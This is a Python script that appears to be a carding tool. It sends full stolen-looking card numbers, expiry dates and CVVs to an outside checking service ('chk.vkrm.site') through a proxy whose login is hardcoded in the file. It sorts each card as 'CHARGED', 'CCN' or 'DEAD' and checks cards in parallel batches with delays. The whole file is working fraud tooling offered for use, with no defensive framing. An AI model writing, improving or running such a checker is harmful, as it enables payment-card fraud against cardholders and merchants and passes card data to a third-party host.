import asyncio
import aiohttp

API_URL = "https://chk.vkrm.site/"
PROXY = "unew.quantumproxies.net:10000:Quantum-3f777gyjdWSRdz6IL:gfj2am3i"

async def check_b3(cc, mm, yy, cvv):
    """Check card using Braintree API with proxy"""
    try:
        card = f"{cc}|{mm}|{yy}|{cvv}"
        url = f"{API_URL}?card={card}&proxy={PROXY}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as response:
                text = await response.text()
                
                try:
                    data = await response.json()
                except:
                    data = {}
                
                if response.status == 200:
                    if 'error' in data:
                        return {'status': 'ERROR', 'response': data.get('error', 'API Error')}
                    
                    if data.get('cxx_site') == 'not_reachable':
                        return {'status': 'ERROR', 'response': 'Proxy connection failed'}
                    
                    status = str(data.get('status', '')).upper()
                    msg = data.get('message', data.get('response', data.get('result', '')))
                    
                    if not msg:
                        for key in ['msg', 'text', 'detail', 'reason']:
                            if key in data:
                                msg = str(data[key])
                                break
                    
                    if not msg and text:
                        msg = text[:200]
                    
                    if not msg:
                        msg = str(data)[:200] if data else 'No response'
                    
                    text_lower = (str(msg) + str(status)).lower()
                    
                    if any(x in text_lower for x in ['live', 'charged', 'success', 'approved', 'valid']):
                        return {'status': 'CHARGED', 'response': msg}
                    elif any(x in text_lower for x in ['ccn', 'cvv', 'insufficient', 'cvc']):
                        return {'status': 'CCN', 'response': msg}
                    elif any(x in text_lower for x in ['dead', 'decline', 'invalid', 'expired', 'fail', 'error']):
                        return {'status': 'DEAD', 'response': msg}
                    else:
                        return {'status': 'DEAD', 'response': msg}
                else:
                    return {'status': 'ERROR', 'response': f'HTTP {response.status}: {text[:100]}'}
                    
    except asyncio.TimeoutError:
        return {'status': 'ERROR', 'response': 'Request timeout (60s)'}
    except Exception as e:
        return {'status': 'ERROR', 'response': str(e)[:100]}

async def mass_check_b3(cards: list, batch_size: int = 5, delay: float = 1.0):
    """Mass check cards with 5 parallel batches and 1 sec delay"""
    results = []
    
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i + batch_size]
        
        tasks = []
        for card_data in batch:
            parts = card_data.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                tasks.append(check_b3(cc, mm, yy, cvv))
        
        if tasks:
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(batch_results):
                card = batch[j] if j < len(batch) else "Unknown"
                if isinstance(result, Exception):
                    results.append({'card': card, 'status': 'ERROR', 'response': str(result)[:50]})
                else:
                    results.append({'card': card, **result})
        
        if i + batch_size < len(cards):
            await asyncio.sleep(delay)
    
    return results
